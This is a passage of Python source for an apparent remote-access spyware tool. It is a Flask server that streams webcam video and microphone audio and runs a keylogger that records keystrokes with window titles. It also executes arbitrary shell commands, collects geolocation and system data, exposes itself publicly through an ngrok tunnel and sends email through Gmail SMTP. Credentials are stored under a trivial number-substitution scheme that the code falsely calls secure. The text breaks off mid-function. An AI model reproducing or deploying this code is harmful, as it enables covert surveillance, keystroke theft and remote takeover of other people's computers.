import cv2
import threading
import pyaudio
import audioop
from flask import Flask, Response, render_template_string, request, jsonify
import time
import socket
import webbrowser
from collections import deque
import numpy as np
import requests
import subprocess
import atexit
import os
import psutil
from datetime import datetime
import json
import queue
import platform
import sys
import geocoder

# Configuration file path
CONFIG_FILE = "seeker_config.json"

class JetsuEncoder:
    """Jetsu encoding/decoding for secure credential storage"""
    
    @staticmethod
    def encode(text):
        """Encode text to Jetsu format"""
        m = {}
        # Uppercase letters A-Z
        for i in range(65, 91):
            m[chr(i)] = 261 + (i - 65)
        # Lowercase letters a-z
        for i in range(97, 123):
            m[chr(i)] = 261 + (i - 97)
        # Special characters
        m.update({
            '@': 69, 
            '.': 6969, 
            ' ': 666666,
            '!': 667, 
            '#': 668, 
            '$': 669, 
            '%': 670,
            '&': 671,
            '*': 672,
            '+': 673,
            '-': 674,
            '=': 675,
            '_': 676,
            '0': 700, '1': 701, '2': 702, '3': 703, '4': 704,
            '5': 705, '6': 706, '7': 707, '8': 708, '9': 709
        })
        return ' '.join(str(m.get(c, ord(c))) for c in text)
    
    @staticmethod
    def decode(encoded_text):
        """Decode Jetsu format to text"""
        m = {}
        # Uppercase letters
        for i in range(65, 91):
            m[261 + (i - 65)] = chr(i).lower()
        # Special characters
        m.update({
            69: '@', 
            6969: '.', 
            666666: ' ',
            667: '!', 668: '#', 669: '$', 670: '%',
            671: '&', 672: '*', 673: '+', 674: '-',
            675: '=', 676: '_',
            700: '0', 701: '1', 702: '2', 703: '3', 704: '4',
            705: '5', 706: '6', 707: '7', 708: '8', 709: '9'
        })
        
        result = []
        for code in encoded_text.split():
            try:
                result.append(m.get(int(code), chr(int(code))))
            except:
                result.append(code)
        return ''.join(result)

def load_config():
    """Load and decode configuration from JSON file"""
    default_config = {
        "email_config": {
            "sender_email": "",
            "sender_password": "",
            "receiver_email": ""
        },
        "ngrok_config": {
            "auth_token": ""
        },
        "general_config": {
            "port": 5000,
            "auto_start_ngrok": True,
            "auto_start_keylogger": False
        }
    }
    
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                print("✅ Configuration loaded successfully")
                
                # Decode Jetsu encoded credentials
                email_config = config.get('email_config', {})
                if email_config:
                    # Decode sender email if it's encoded
                    sender_email = email_config.get('sender_email', '')
                    if sender_email and not '@' in sender_email:
                        try:
                            config['email_config']['sender_email'] = JetsuEncoder.decode(sender_email)
                            print("🔓 Decoded sender email")
                        except:
                            print("⚠️  Could not decode sender email")
                    
                    # Decode sender password if it's encoded
                    sender_password = email_config.get('sender_password', '')
                    if sender_password and not any(c in sender_password for c in ['@', '.', ' ']):
                        try:
                            config['email_config']['sender_password'] = JetsuEncoder.decode(sender_password)
                            print("🔓 Decoded sender password")
                        except:
                            print("⚠️  Could not decode sender password")
                    
                    # Decode receiver email if it's encoded
                    receiver_email = email_config.get('receiver_email', '')
                    if receiver_email and not '@' in receiver_email:
                        try:
                            config['email_config']['receiver_email'] = JetsuEncoder.decode(receiver_email)
                            print("🔓 Decoded receiver email")
                        except:
                            print("⚠️  Could not decode receiver email")
                
                return config
        else:
            # Create default config file
            with open(CONFIG_FILE, 'w') as f:
                json.dump(default_config, f, indent=2)
            print("📁 Configuration file created: seeker_config.json")
            print("📝 Please edit it with your email credentials")
            return None
    except Exception as e:
        print(f"❌ Error loading configuration: {e}")
        return None

def save_config_with_encoding(config):
    """Save configuration with Jetsu encoded credentials"""
    try:
        # Create a copy to avoid modifying the original
        config_to_save = config.copy()
        config_to_save['email_config'] = config['email_config'].copy()
        
        # Encode sensitive email data
        sender_email = config['email_config'].get('sender_email', '')
        if sender_email:
            config_to_save['email_config']['sender_email'] = JetsuEncoder.encode(sender_email)
        
        sender_password = config['email_config'].get('sender_password', '')
        if sender_password:
            config_to_save['email_config']['sender_password'] = JetsuEncoder.encode(sender_password)
        
        receiver_email = config['email_config'].get('receiver_email', '')
        if receiver_email:
            config_to_save['email_config']['receiver_email'] = JetsuEncoder.encode(receiver_email)
        
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config_to_save, f, indent=2)
        
        print("✅ Configuration saved with Jetsu encoding")
        return True
    except Exception as e:
        print(f"❌ Error saving configuration: {e}")
        return False

def validate_config(config):
    """Validate that required configuration is present"""
    if not config:
        return False
    
    email_config = config.get('email_config', {})
    sender_email = email_config.get('sender_email', '')
    sender_password = email_config.get('sender_password', '')
    receiver_email = email_config.get('receiver_email', '')
    
    # Check if required email fields are filled
    if not sender_email or not sender_password or not receiver_email:
        print("❌ Missing email configuration. Please check seeker_config.json")
        print("   Required fields: sender_email, sender_password, receiver_email")
        return False
    
    # Basic email format validation
    if '@' not in sender_email or '@' not in receiver_email:
        print("❌ Invalid email format in configuration")
        return False
    
    print("✅ Configuration validated successfully")
    return True

def setup_config_interactive():
    """Interactive configuration setup"""
    print("\n🎯 Let's set up your configuration securely!")
    print("   Your credentials will be stored using Jetsu encoding")
    print("=" * 50)
    
    config = {
        "email_config": {},
        "ngrok_config": {},
        "general_config": {
            "port": 5000,
            "auto_start_ngrok": True,
            "auto_start_keylogger": False
        }
    }
    
    # Email configuration
    print("\n📧 Email Configuration:")
    config["email_config"]["sender_email"] = input("   Sender Gmail address: ").strip()
    config["email_config"]["sender_password"] = input("   Gmail App Password: ").strip()
    config["email_config"]["receiver_email"] = input("   Receiver email: ").strip()
    
    # Ngrok configuration (optional)
    print("\n🌐 Ngrok Configuration (optional):")
    auth_token = input("   Ngrok Auth Token (press Enter to skip): ").strip()
    if auth_token:
        config["ngrok_config"]["auth_token"] = auth_token
    
    # Save configuration with encoding
    if save_config_with_encoding(config):
        print("\n✅ Configuration saved securely!")
        print("🔒 Your credentials are now Jetsu encoded in the config file")
        return config
    else:
        print("❌ Failed to save configuration")
        return None

# Load and validate configuration
config = load_config()
if not config:
    # Interactive setup if no config exists
    config = setup_config_interactive()
    if not config:
        print("❌ Program cannot start without configuration.")
        sys.exit(1)

if not validate_config(config):
    print("❌ Invalid configuration. Please check seeker_config.json")
    sys.exit(1)

# Extract configuration values
EMAIL_CONFIG = config['email_config']
NGROK_CONFIG = config['ngrok_config']
GENERAL_CONFIG = config['general_config']

# For Windows active window detection
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import win32con
    except ImportError:
        print("⚠️  pywin32 not installed - some keylogger features may not work")

app = Flask(__name__)

import smtplib
from email.mime.text import MIMEText

class SecureJetsuMailer:
    def __init__(self):
        # Use configuration from file (already decoded)
        self.sender_email = EMAIL_CONFIG['sender_email']
        self.sender_password = EMAIL_CONFIG['sender_password']
        self.receiver_email = EMAIL_CONFIG['receiver_email']
        
        # Verify email configuration
        if not all([self.sender_email, self.sender_password, self.receiver_email]):
            raise ValueError("Email configuration incomplete. Check seeker_config.json")
    
    def _to_jetsu(self, text):
        """Encode message using Jetsu"""
        m = {}
        for i in range(65, 91):
            m[chr(i)] = 261 + (i - 65)
        for i in range(97, 123):
            m[chr(i)] = 261 + (i - 97)
        m.update({'@': 69, '.': 6969, ' ': 666666})
        return ' '.join(str(m.get(c, c)) for c in text)
    
    def _from_jetsu(self, encoded_text):
        """Decode Jetsu message"""
        m = {}
        for i in range(65, 91):
            m[261 + (i - 65)] = chr(i).lower()
        m.update({69: '@', 6969: '.', 666666: ' '})
        
        result = []
        for code in encoded_text.split():
            try:
                result.append(m.get(int(code), code))
            except:
                result.append(code)
        return ''.join(result)
    
    def send(self, subject, message):
        """Send readable email using configured credentials"""
        try:
            # Send message as plain text (not encoded)
            msg = MIMEText(message)
            msg['Subject'] = subject
            msg['From'] = self.sender_email
            msg['To'] = self.receiver_email
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.send_message(msg)
            server.quit()
            
            print(f"✅ Email sent to {self.receiver_email}")
            return True
        except Exception as e:
            print(f"❌ Send failed: {e}")
            return False

    def test_connection(self):
        """Test email configuration"""
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.sender_email, self.sender_password)
            server.quit()
            print("✅ Email configuration test passed")
            return True
        except Exception as e:
            print(f"❌ Email configuration test failed: {e}")
            return False

# Global variables for camera and audio
latest_frame = None
frame_lock = threading.Lock()
audio_buffer = deque(maxlen=44100 * 1)  # 1 second buffer for better performance
chat_messages_deque = deque(maxlen=50)  # Store last 50 messages
popup_queue = queue.Queue()
command_history = deque(maxlen=20)  # Store last 20 commands

# Audio configuration
AUDIO_FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

# Ngrok configuration from config file
NGROK_AUTH_TOKEN = NGROK_CONFIG.get('auth_token', '')
ngrok_process = None
ngrok_url = None

# General configuration
PORT = GENERAL_CONFIG.get('port', 5000)
AUTO_START_NGROK = GENERAL_CONFIG.get('auto_start_ngrok', True)
AUTO_START_KEYLOGGER = GENERAL_CONFIG.get('auto_start_keylogger', False)

class GeolocationTracker:
    def __init__(self):
        self.location_data = {}
    
    def get_geolocation(self):
        """Get detailed geolocation information using multiple methods"""
        try:
            # Method 1: Using geocoder with multiple services
            location = self._get_geocoder_location()
            if location:
                return location
            
            # Method 2: Using ip-api.com
            location = self._get_ipapi_location()
            if location:
                return location
                
            # Method 3: Using ipinfo.io
            location = self._get_ipinfo_location()
            if location:
                return location
                
            return None
        except Exception as e:
            print(f"Geolocation error: {e}")
            return self._fallback_geolocation()
    
    def _get_geocoder_location(self):
        """Get location using geocoder library"""
        try:
            # Try multiple geocoder services
            services = ['ipinfo', 'ipapi', 'freegeoip']
            
            for service in services:
                try:
                    g = geocoder.ip('me', method=service)
                    if g.ok and g.latlng:
                        self.location_data = {
                            'ip_address': g.ip,
                            'city': g.city,
                            'region': g.state,
                            'country': g.country,
                            'latitude': g.latlng[0],
                            'longitude': g.latlng[1],
                            'isp': 'Unknown',
                            'timezone': 'Unknown',
                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        return self.location_data
                except:
                    continue
            return None
        except:
            return None
    
    def _get_ipapi_location(self):
        """Get location using ip-api.com"""
        try:
            response = requests.get('http://ip-api.com/json/', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'success':
                    self.location_data = {
                        'ip_address': data.get('query', ''),
                        'city': data.get('city', ''),
                        'region': data.get('regionName', ''),
                        'country': data.get('country', ''),
                        'latitude': data.get('lat', 0),
                        'longitude': data.get('lon', 0),
                        'isp': data.get('isp', 'Unknown'),
                        'timezone': data.get('timezone', 'Unknown'),
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    return self.location_data
            return None
        except:
            return None
    
    def _get_ipinfo_location(self):
        """Get location using ipinfo.io"""
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                loc = data.get('loc', '').split(',')
                if len(loc) == 2:
                    self.location_data = {
                        'ip_address': data.get('ip', ''),
                        'city': data.get('city', ''),
                        'region': data.get('region', ''),
                        'country': data.get('country', ''),
                        'latitude': float(loc[0]),
                        'longitude': float(loc[1]),
                        'isp': data.get('org', 'Unknown'),
                        'timezone': data.get('timezone', 'Unknown'),
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    return self.location_data
            return None
        except:
            return None
    
    def _fallback_geolocation(self):
        """Final fallback method"""
        try:
            # Simple IP detection
            public_ip = self._get_public_ip()
            if public_ip:
                self.location_data = {
                    'ip_address': public_ip,
                    'city': 'Unknown',
                    'region': 'Unknown',
                    'country': 'Unknown',
                    'latitude': 0,
                    'longitude': 0,
                    'isp': 'Unknown',
                    'timezone': 'Unknown',
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                return self.location_data
        except:
            pass
        return None
    
    def _get_public_ip(self):
        """Get public IP address"""
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            return response.text.strip()
        except:
            try:
                response = requests.get('https://ident.me', timeout=5)
                return response.text.strip()
            except:
                return None
    
    def get_google_maps_url(self):
        """Get Google Maps URL for the location"""
        if self.location_data and 'latitude' in self.location_data and self.location_data['latitude'] != 0:
            lat = self.location_data['latitude']
            lng = self.location_data['longitude']
            return f"https://www.google.com/maps?q={lat},{lng}"
        return None

class KeyLogger:
    def __init__(self):
        self.log_file = "keylog.txt"
        self.is_logging = False
        self.log_thread = None
        self.buffer = []
        self.buffer_size = 20  # Save every 20 keystrokes
        self.buffer_lock = threading.Lock()
        
    def start_logging(self):
        """Start keylogging"""
        if self.is_logging:
            return False
            
        try:
            self.is_logging = True
            self.log_thread = threading.Thread(target=self._logging_loop, daemon=True)
            self.log_thread.start()
            print("✅ Keylogger started")
            return True
        except Exception as e:
            print(f"❌ Keylogger failed to start: {e}")
            return False
    
    def stop_logging(self):
        """Stop keylogging"""
        if not self.is_logging:
            return False
            
        self.is_logging = False
        if self.log_thread:
            self.log_thread.join(timeout=2.0)
        
        # Save any remaining buffer
        with self.buffer_lock:
            if self.buffer:
                self._save_buffer()
                
        print("✅ Keylogger stopped")
        return True
    
    def _logging_loop(self):
        """Main logging loop using pynput for better compatibility"""
        try:
            from pynput import keyboard
        except ImportError:
            print("❌ pynput not installed. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
                from pynput import keyboard
                print("✅ pynput installed successfully")
            except:
                print("❌ Failed to install pynput. Keylogger will not work.")
                return

        def on_press(key):
            if not self.is_logging:
                return False
                
            try:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Convert key to string
                try:
                    # Handle special keys
                    if hasattr(key, 'char') and key.char is not None:
                        key_str = key.char
                    else:
                        key_str = f'[{key.name}]'
                except AttributeError:
                    key_str = f'[{key}]'
                
                # Handle special cases
                if key == keyboard.Key.space:
                    key_str = ' '
                elif key == keyboard.Key.enter:
                    key_str = '\n'
                elif key == keyboard.Key.tab:
                    key_str = '\t'
                elif key == keyboard.Key.backspace:
                    key_str = '[BACKSPACE]'
                elif key == keyboard.Key.esc:
                    key_str = '[ESC]'
                
                # Add to buffer
                with self.buffer_lock:
                    self.buffer.append({
                        'timestamp': timestamp,
                        'key': key_str,
                        'application': self._get_active_window()
                    })
                    
                    # Save if buffer is full
                    if len(self.buffer) >= self.buffer_size:
                        self._save_buffer()
                        
            except Exception as e:
                print(f"Key processing error: {e}")
        
        def on_release(key):
            # Stop listener if ESC is pressed and logging is stopped
            if key == keyboard.Key.esc and not self.is_logging:
                return False
            return True

        # Start the listener
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            while self.is_logging:
                time.sleep(0.1)
            listener.stop()
    
    def _get_active_window(self):
        """Get active window title"""
        try:
            if platform.system() == "Windows":
                import win32gui
                window = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(window)
                return title if title else "Unknown"
            elif platform.system() == "Darwin":  # macOS
                from AppKit import NSWorkspace
                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
            else:  # Linux
                try:
                    result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                          capture_output=True, text=True, timeout=2)
                    return result.stdout.strip() if result.stdout else "Unknown"
                except:
                    return "Unknown"
        except:
            return "Unknown"
    
    def _save_buffer(self):
        """Save buffer to file"""
        try:
            if not self.buffer:
                return
                
            with open(self.log_file, "a", encoding="utf-8") as f:
                for entry in self.buffer:
                    f.write(f"[{entry['timestamp']}] [{entry['application']}] {entry['key']}\n")
            
            print(f"💾 Saved {len(self.buffer)} keystrokes to {self.log_file}")
            self.buffer.clear()
            
        except Exception as e:
            print(f"Save buffer error: {e}")
    
    def get_logs(self, lines=100):
        """Get recent logs"""
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, "r", encoding="utf-8") as f:
                    all_lines = f.readlines()
                # Return last 'lines' lines
                return ''.join(all_lines[-lines:]) if all_lines else "No keystrokes recorded yet"
            return "No log file found"
        except Exception as e:
            return f"Error reading logs: {e}"
    
    def clear_logs(self):
        """Clear log file"""
        try:
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                self.buffer.clear()
                print("🗑️ Keylogs cleared")
                return True
            return False
        except Exception as e:
            print(f"Error clearing logs: {e}")
            return False
    
    def get_status(self):
        """Get keylogger status"""
        return {
            'is_running': self.is_logging,
            'buffer_size': len(self.buffer),
            'log_file': self.log_file,
            'log_file_exists': os.path.exists(self.log_file)
        }

class CommandManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.current_directory = os.getcwd()
    
    def execute_command(self, command, timeout=30):
        """Execute a command and return the output"""
        try:
            # Change directory if cd command
            if command.strip().startswith('cd '):
                new_dir = command.strip()[3:].strip()
                try:
                    if new_dir:
                        os.chdir(new_dir)
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"Error changing directory: {str(e)}"
            
            # Execute the command
            if platform.system().lower() == "windows":
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    cwd=self.current_directory
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    cwd=self.current_directory,
                    executable='/bin/bash'
                )
            
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                return_code = process.returncode
                
                output = ""
                if stdout:
                    output += stdout
                if stderr:
                    output += f"\n[ERROR] {stderr}"
                if return_code != 0 and not stderr:
                    output += f"\n[Process exited with code {return_code}]"
                
                return output.strip() or "Command executed (no output)"
                
            except subprocess.TimeoutExpired:
                process.kill()
                return "Command timed out (30 seconds)"
                
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def get_current_directory(self):
        """Get current working directory"""
        return self.current_directory

class CameraManager:
    def __init__(self):
        self.cameras = {}
        self.frame_data = {}
        self.lock = threading.Lock()
        self.quality = 60  # Lower quality for better performance
        
    def add_camera(self, camera_id=0):
        """Add a camera to the manager"""
        with self.lock:
            if camera_id not in self.cameras:
                self.cameras[camera_id] = {
                    'running': False,
                    'thread': None,
                    'camera': None
                }
                self.frame_data[camera_id] = None
                return True
        return False
    
    def start_camera(self, camera_id=0):
        """Start a camera"""
        with self.lock:
            if camera_id in self.cameras and not self.cameras[camera_id]['running']:
                self.cameras[camera_id]['running'] = True
                thread = threading.Thread(
                    target=self._camera_loop, 
                    args=(camera_id,), 
                    daemon=True
                )
                self.cameras[camera_id]['thread'] = thread
                thread.start()
                return True
        return False
    
    def stop_camera(self, camera_id=0):
        """Stop a camera"""
        with self.lock:
            if camera_id in self.cameras:
                self.cameras[camera_id]['running'] = False
                if self.cameras[camera_id]['camera']:
                    self.cameras[camera_id]['camera'].release()
                return True
        return False
    
    def _camera_loop(self, camera_id):
        """Camera capture loop - optimized for performance"""
        # Try different backends for better compatibility
        backends = [cv2.CAP_DSHOW, cv2.CAP_MSMF, cv2.CAP_V4L2, cv2.CAP_ANY]
        camera = None
        
        for backend in backends:
            try:
                camera = cv2.VideoCapture(camera_id, backend)
                if camera.isOpened():
                    print(f"✅ Camera opened with backend: {backend}")
                    break
            except:
                continue
        
        if not camera or not camera.isOpened():
            print(f"❌ Failed to open camera {camera_id}")
            return
        
        # Set optimized camera settings
        camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)  # Lower resolution for performance
        camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
        camera.set(cv2.CAP_PROP_FPS, 20)  # Lower FPS for smoother streaming
        camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)  # Minimal buffer to reduce latency
        camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))  # Better compression
        
        with self.lock:
            self.cameras[camera_id]['camera'] = camera
        
        frame_count = 0
        last_time = time.time()
        
        try:
            while self.cameras[camera_id]['running']:
                success, frame = camera.read()
                if not success:
                    print(f"Camera {camera_id} read failed")
                    break
                
                # Skip frames if we're falling behind (frame dropping for performance)
                frame_count += 1
                current_time = time.time()
                if current_time - last_time >= 1.0:
                    actual_fps = frame_count / (current_time - last_time)
                    if actual_fps > 25:  # If capturing too fast, reduce quality
                        self.quality = max(30, self.quality - 5)
                    elif actual_fps < 15:  # If too slow, increase quality
                        self.quality = min(80, self.quality + 5)
                    frame_count = 0
                    last_time = current_time
                
                # Process frame (minimal processing for performance)
                processed_frame = self._process_frame(frame)
                
                # Encode as JPEG with adaptive quality
                ret, buffer = cv2.imencode('.jpg', processed_frame, 
                                         [cv2.IMWRITE_JPEG_QUALITY, self.quality])
                frame_bytes = buffer.tobytes()
                
                with self.lock:
                    self.frame_data[camera_id] = frame_bytes
                
                time.sleep(0.05)  # ~20 FPS for smoother performance
        except Exception as e:
            print(f"Camera {camera_id} error: {e}")
        finally:
            camera.release()
            with self.lock:
                self.cameras[camera_id]['running'] = False
    
    def _process_frame(self, frame):
        """Process frame with minimal operations for performance"""
        # Add timestamp only (minimal processing)
        timestamp = time.strftime("%H:%M:%S")
        cv2.putText(frame, timestamp, (10, 30), 
                   cv2.FONT_HERSHEY_SIMPLEX, 0.6, (255, 255, 255), 1)
        return frame
    
    def get_frame(self, camera_id):
        """Get latest frame from camera"""
        with self.lock:
            return self.frame_data.get(camera_id)

class AudioManager:
    def __init__(self):
        self.audio = pyaudio.PyAudio()
        self.stream = None
        self.recording = False
        self.lock = threading.Lock()
        self.audio_device_index = self._find_camera_microphone()
        
    def _find_camera_microphone(self):
        """Try to find microphone associated with camera"""
        info = self.audio.get_host_api_info_by_index(0)
        num_devices = info.get('deviceCount')
        
        # Look for devices that might be camera microphones
        camera_keywords = ['camera', 'webcam', 'video', 'integrated', 'array']
        
        for i in range(0, num_devices):
            device_info = self.audio.get_device_info_by_host_api_device_index(0, i)
            device_name = device_info.get('name', '').lower()
            
            # Check if device has input channels and matches camera keywords
            if device_info.get('maxInputChannels', 0) > 0:
                # Prefer devices that sound like camera microphones
                if any(keyword in device_name for keyword in camera_keywords):
                    return i
        
        # If no camera mic found, use default input device
        return None
    
    def start_recording(self):
        """Start audio recording from camera microphone"""
        with self.lock:
            if self.recording:
                return False
            
            try:
                self.stream = self.audio.open(
                    format=AUDIO_FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK,
                    input_device_index=self.audio_device_index,
                )
                self.recording = True
                return True
            except Exception as e:
                # Fallback to default device
                try:
                    self.stream = self.audio.open(
                        format=AUDIO_FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK,
                        input_device_index=None
                    )
                    self.recording = True
                    return True
                except Exception as e2:
                    return False
    
    def stop_recording(self):
        """Stop audio recording"""
        with self.lock:
            if self.stream and self.recording:
                self.recording = False
                self.stream.stop_stream()
                self.stream.close()
                self.stream = None
                return True
            return False
    
    def read_audio(self):
        """Read audio data"""
        with self.lock:
            if self.recording and self.stream:
                try:
                    data = self.stream.read(CHUNK, exception_on_overflow=False)
                    # Normalize audio volume
                    rms = audioop.rms(data, 2)
                    if rms > 1000:
                        data = audioop.mul(data, 2, min(2.0, 3000.0 / max(1, rms)))
                    return data
                except Exception as e:
                    return None
            return None
    
    def cleanup(self):
        """Clean up audio resources"""
        self.stop_recording()
        self.audio.terminate()

class NgrokManager:
    def __init__(self, port=5000):
        self.port = port
        self.process = None
        self.public_url = None
        
    def start_ngrok(self):
        """Start ngrok tunnel"""
        try:
            # Check if ngrok is installed
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode != 0:
                print("❌ Ngrok is not installed. Please install ngrok first:")
                print("   Visit: https://ngrok.com/download")
                print("   Or install via pip: pip install pyngrok")
                return False
            
            # Start ngrok tunnel
            if NGROK_AUTH_TOKEN:
                subprocess.run(['ngrok', 'authtoken', NGROK_AUTH_TOKEN], capture_output=True)
            
            # Start ngrok in background
            self.process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait for ngrok to start and get URL
            time.sleep(3)
            self.public_url = self.get_ngrok_url()
            
            if self.public_url:
                print(f"🌐 Ngrok tunnel started: {self.public_url}")
                return True
            else:
                print("❌ Failed to start ngrok tunnel")
                return False
                
        except Exception as e:
            print(f"❌ Ngrok error: {e}")
            return False
    
    def get_ngrok_url(self):
        """Get the public ngrok URL"""
        try:
            response = requests.get('http://localhost:4040/api/tunnels')
            if response.status_code == 200:
                tunnels = response.json()['tunnels']
                for tunnel in tunnels:
                    if tunnel['proto'] == 'https':
                        return tunnel['public_url']
            return None
        except:
            return None
    
    def stop_ngrok(self):
        """Stop ngrok tunnel"""
        if self.process:
            self.process.terminate()
            self.process.wait()
            print("🔒 Ngrok tunnel stopped")

class SystemMonitor:
    @staticmethod
    def get_system_info():
        """Get system information"""
        try:
            # CPU usage
            cpu_percent = psutil.cpu_percent(interval=0.5)
            
            # Memory usage
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            memory_used = memory.used / (1024**3)  # GB
            memory_total = memory.total / (1024**3)  # GB
            
            # Disk usage
            disk = psutil.disk_usage('/')
            disk_percent = disk.percent
            disk_used = disk.used / (1024**3)  # GB
            disk_total = disk.total / (1024**3)  # GB
            
            # Network info
            net_io = psutil.net_io_counters()
            network_sent = net_io.bytes_sent / (1024**2)  # MB
            network_recv = net_io.bytes_recv / (1024**2)  # MB
            
            # Battery (if available)
            try:
                battery = psutil.sensors_battery()
                battery_percent = battery.percent if battery else None
                battery_plugged = battery.power_plugged if battery else None
            except:
                battery_percent = None
                battery_plugged = None
            
            return {
                'cpu_percent': cpu_percent,
                'memory_percent': memory_percent,
                'memory_used': round(memory_used, 2),
                'memory_total': round(memory_total, 2),
                'disk_percent': disk_percent,
                'disk_used': round(disk_used, 2),
                'disk_total': round(disk_total, 2),
                'network_sent': round(network_sent, 2),
                'network_recv': round(network_recv, 2),
                'battery_percent': battery_percent,
                'battery_plugged': battery_plugged,
                'timestamp': datetime.now().strftime("%H:%M:%S")
            }
        except Exception as e:
            print(f"System monitor error: {e}")
            return {}
    
    @staticmethod
    def get_running_processes(limit=15):
        """Get list of running processes"""
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'cpu': proc.info['cpu_percent'] or 0,
                        'memory': round(proc.info['memory_percent'] or 0, 2),
                        'status': proc.info['status']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # Sort by CPU usage and limit results
            processes.sort(key=lambda x: x['cpu'], reverse=True)
            return processes[:limit]
        except Exception as e:
            print(f"Process monitor error: {e}")
            return []

class UniversalPopupManager:
    def __init__(self):
        self.running = False
        self.thread = None
        
    def start(self):
        """Start the popup manager"""
        self.running = True
        self.thread = threading.Thread(target=self._popup_worker, daemon=True)
        self.thread.start()
        print("🔔 Universal popup manager started")
        
    def stop(self):
        """Stop the popup manager"""
        self.running = False
        print("🔔 Popup manager stopped")
    
    def _popup_worker(self):
        """Worker thread to handle popup notifications"""
        while self.running:
            try:
                message_data = popup_queue.get(timeout=1.0)
                self._show_universal_notification(message_data['message'], message_data['sender'])
            except queue.Empty:
                continue
            except Exception as e:
                print(f"Popup worker error: {e}")
    
    def _show_universal_notification(self, message, sender):
        """Try multiple methods to show notification"""
        print(f"🔔 Attempting to show notification from {sender}: {message}")
        
        # Method 1: Try Windows Toast (most reliable on Windows 10/11)
        if self._try_windows_toast(message, sender):
            return
            
        # Method 2: Try tkinter simple
        if self._try_tkinter_simple(message, sender):
            return
            
        # Method 3: Try platform-specific methods
        if self._try_platform_specific(message, sender):
            return
            
        # Method 4: Ultimate fallback
        self._ultimate_fallback(message, sender)
    
    def _try_windows_toast(self, message, sender):
        """Try Windows toast notifications"""
        try:
            # First try win10toast
            from win10toast import ToastNotifier
            toaster = ToastNotifier()
            toaster.show_toast(
                f"💬 {sender}",
                message,
                duration=5,
                threaded=True
            )
            print("✅ Used Windows toast notification")
            return True
        except ImportError:
            print("ℹ️ win10toast not installed")
        except Exception as e:
            print(f"❌ Windows toast failed: {e}")
        
        # Try alternative Windows method
        try:
            if platform.system().lower() == "windows":
                # Use powershell for notification
                ps_script = f'''
                Add-Type -AssemblyName System.Windows.Forms
                $global:balloon = New-Object System.Windows.Forms.NotifyIcon
                $path = Get-Process -id $pid | Select-Object -ExpandProperty Path
                $balloon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
                $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
                $balloon.BalloonTipText = "{message}"
                $balloon.BalloonTipTitle = "💬 {sender}"
                $balloon.Visible = $true
                $balloon.ShowBalloonTip(5000)
                '''
                result = subprocess.run(['powershell', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    print("✅ Used PowerShell notification")
                    return True
        except Exception as e:
            print(f"❌ PowerShell notification failed: {e}")
            
        return False
    
    def _try_tkinter_simple(self, message, sender):
        """Try simple tkinter messagebox"""
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            # Create and immediately hide the root window
            root = tk.Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            # Show messagebox (this should work on most systems)
            messagebox.showinfo(f"💬 {sender}", message)
            
            # Clean up
            root.destroy()
            print("✅ Used tkinter messagebox")
            return True
        except Exception as e:
            print(f"❌ Tkinter simple failed: {e}")
            return False
    
    def _try_platform_specific(self, message, sender):
        """Try platform-specific notification methods"""
        system_name = platform.system().lower()
        
        if system_name == "windows":
            return self._try_windows_specific(message, sender)
